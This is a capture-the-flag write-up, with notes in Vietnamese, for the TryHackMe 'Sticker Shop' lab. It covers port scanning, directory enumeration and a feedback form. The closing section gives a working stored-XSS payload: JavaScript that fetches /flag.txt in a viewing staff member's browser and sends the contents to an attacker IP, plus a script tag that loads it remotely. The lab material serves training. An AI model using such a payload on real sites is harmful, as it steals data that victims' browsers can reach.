---
title: THM - The Sticker Shop
date: 27-02-2025
category: ctf
---
# Enumeration
## Scan
```bash
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)

8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10

Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## SSH (22)
```bash
└─$ ssh root@thestickershop.thm
The authenticity of host 'thestickershop.thm (10.10.18.24)' can't be established.
ED25519 key fingerprint is SHA256:Sz1Pmdc1D8HxAGF2zxbrchswjJ7Cyiu2KYRpqiel54E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thestickershop.thm' (ED25519) to the list of known hosts.
root@thestickershop.thm's password: 
Permission denied, please try again.
root@thestickershop.thm's password: 
Permission denied, please try again.
root@thestickershop.thm's password: 
root@thestickershop.thm: Permission denied (publickey,password).
```
- Target su dung password-based ssh
## Web (8080)
![[Pasted image 20250227225530.png]]
- /submit_feedback cho phep gui feedback, co the la len database
### Dirsearch
```bash
└─$ dirsearch -u http://thestickershop.thm:8080/

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://thestickershop.thm:8080/

[22:57:35] Starting: 
[23:00:33] 401 -   25B  - /flag.txt

Task Completed

```
- Co /flag.txt nhung ma 401:
![[Pasted image 20250227230435.png]]
### Vhost/Subdomain
```bash

```
### Feedback page
![[Pasted image 20250227233508.png]]
- Day la cai duy nhat ta co the thu
- Trick o day la neu gap cau kieu nhu *"se danh gia", "se xu ly"* cua admin hoac staff thi co nghia la se co ai do click cai ban gui.
- Nhiem vu: Tao payload de victim click, kha nang o day la **XSS**
```javascript
// fetch-get.js

fetch("/flag.txt")

.then(response => response.text())

.then(data => {
	const encodedData = encodeURIComponent(data);
	const url = "http://10.8.16.212?data=" + encodedData;
	return fetch(url);
});
```
- De gui doan script js nay ta co them no vao `script` tag:
```html
<script src="http://{ip}/fetch-get.js"></script>
```